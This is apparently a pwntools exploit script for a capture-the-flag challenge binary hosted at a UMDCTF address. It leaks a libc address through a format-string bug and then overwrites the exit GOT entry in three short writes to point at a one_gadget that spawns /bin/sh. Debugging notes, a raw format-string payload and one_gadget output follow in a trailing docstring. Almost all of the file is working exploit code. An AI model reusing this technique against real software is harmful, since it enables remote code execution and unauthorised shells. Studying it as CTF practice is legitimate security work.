#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
context.terminal = ["tilix","-a","session-add-right","-e"]


exe = context.binary = ELF('./chall')

host = args.HOST or 'chals5.umdctf.io'
port = int(args.PORT or 7002)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
b *main
continue
'''.format(**locals())

# -- Exploit goes here --

def kekw(payload):
    io.sendlineafter("> ", payload, timeout=1)
libc = ELF("./libc.so.6")
io = start()
padding = "A"*272
payload = flat([

    padding,
    "%51$p"

])
def get_last_digits(num, last_digits_count=4):
    return abs(num) % (10**last_digits_count)
kekw(payload)
io.recvuntil("Current location: ")
libc.address = int(io.recvline().strip("\n").decode('utf-8'), 16) - 0x21bf7
log.info("LIBC BASE : %s" % hex(libc.address))
lmao = libc.sym['printf'] - libc.sym['system'] - 83155
one_shot = libc.address + 0xe5617
print(fmtstr_payload(16, {exe.got.exit: one_shot & 0xffff}, write_size='short'))
print(hex(one_shot & 0xffff))
payload = flat([

    padding,
    fmtstr_payload(16, {exe.got.exit: one_shot & 0xffff}, write_size='short')

])
kekw(payload)
pause()
payload = flat([

    padding,
    fmtstr_payload(16, {exe.got.exit+2: (one_shot & 0xffff0000) >> 16}, write_size='short')

])
kekw(payload)
pause()
payload = flat([

    padding,
    fmtstr_payload(16, {exe.got.exit+4: (one_shot >> 32)}, write_size='short')

])
kekw(payload)
pause()

"""
                                 0x7f64640ef622
[0x404040] printf@GLIBC_2.2.5 -> 0x7f646406ef70 (printf) ◂— sub    rsp, 0xd8
[0x404040] printf@GLIBC_2.2.5 -> 0x7f6464065624 (vfprintf+404) ◂— mov    rsi, rbx


%17744c%23$hn%1367c%24$hn%13639c%25$n\x00\x00\x00@@@\x00\x00\x00\x00\x00B@@\x00\x00\x00\x00\x00D@@\x00\x00\x00\x00\x00
0x7fee4aa89f70
0x7fee4aa8bef2
senpaikichoothmechannamasaladaalu
$1 = (int (*)(const char *)) 0x7fee4aa74550 <__libc_system>

$2 = (int (*)(const char *, ...)) 0x7fee4aa89f70 <__printf>

0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0xe546f execve("/bin/sh", r13, rbx)
constraints:
  [r13] == NULL || r13 == NULL
  [rbx] == NULL || rbx == NULL

0xe5617 execve("/bin/sh", [rbp-0x88], [rbp-0x70])
constraints:
  [[rbp-0x88]] == NULL || [rbp-0x88] == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xe561e execve("/bin/sh", rcx, [rbp-0x70])
constraints:
  [rcx] == NULL || rcx == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xe5622 execve("/bin/sh", rcx, rdx)
constraints:
  [rcx] == NULL || rcx == NULL
  [rdx] == NULL || rdx == NULL

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

0x10a428 execve("/bin/sh", rsi, [rax])
constraints:
  [rsi] == NULL || rsi == NULL
  [[rax]] == NULL || [rax] == NULL

"""
io.interactive()